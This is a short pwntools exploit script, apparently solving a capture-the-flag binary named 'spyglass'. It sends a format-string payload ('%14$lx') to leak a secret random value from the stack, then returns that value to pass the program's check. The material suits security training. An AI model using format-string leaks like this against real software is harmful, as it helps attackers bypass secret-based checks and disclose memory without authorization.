from pwn import *

elf = ELF("./spyglass")
p = process("./spyglass")
p.recvuntil(b"):")
printf_vuln = b"1.%14$lx"
p.sendline(printf_vuln)
sec_rand = p.recvuntil(b"W")
sec_rand = sec_rand[3:]
sec_rand = sec_rand[:-2]
print(sec_rand)
# got the ASCII now to int/long
sec_rand_hex = bytes.fromhex(sec_rand.decode())
sec_rand_int = int.from_bytes(sec_rand_hex)
print(sec_rand_int)
p.recvuntil(b"):")
p.sendline(str(sec_rand_int).encode())
p.interactive()
